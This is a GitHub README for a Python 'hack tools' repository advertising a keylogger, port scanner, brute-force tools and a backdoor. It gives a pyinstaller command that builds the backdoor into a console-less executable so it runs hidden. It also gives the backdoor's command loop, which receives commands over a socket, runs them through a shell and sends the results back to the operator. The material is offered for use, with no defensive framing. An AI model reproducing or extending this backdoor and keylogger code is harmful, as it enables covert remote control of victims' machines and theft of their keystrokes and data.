# HackToolsV2
Python Keylogger PortScanner BruteForce and basic hack tools.(new ones will come soon)
![Ekran Alıntıs2ı](https://user-images.githubusercontent.com/69467096/112681821-46388780-8e80-11eb-89ab-7d1fc21476ea.PNG)
![Ekran Alıntısı](https://user-images.githubusercontent.com/69467096/112681920-66684680-8e80-11eb-8e59-552d65c3f1fb.PNG)

[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)

## To make exe file write this code block to terminal
```python
pyinstaller backdoor.py --onefile --noconsole
```
### Additional codes:
#command = reliable_recv()
#message = 'Hello world'
#s.send(message.encode())

#s.recv(1024)
#execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

#result = execute.stdout.read() + execute.stderr.read()
#reliable_send(result)
```python
command = reliable_recv()
message = 'Hello world'
s.send(message.encode())

s.recv(1024)
execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

result = execute.stdout.read() + execute.stderr.read()
reliable_send(result)
```
![Ekran Alıntısı](https://user-images.githubusercontent.com/69467096/112891291-a4fc3c00-90e0-11eb-81bd-604dd01c9b0d.PNG)
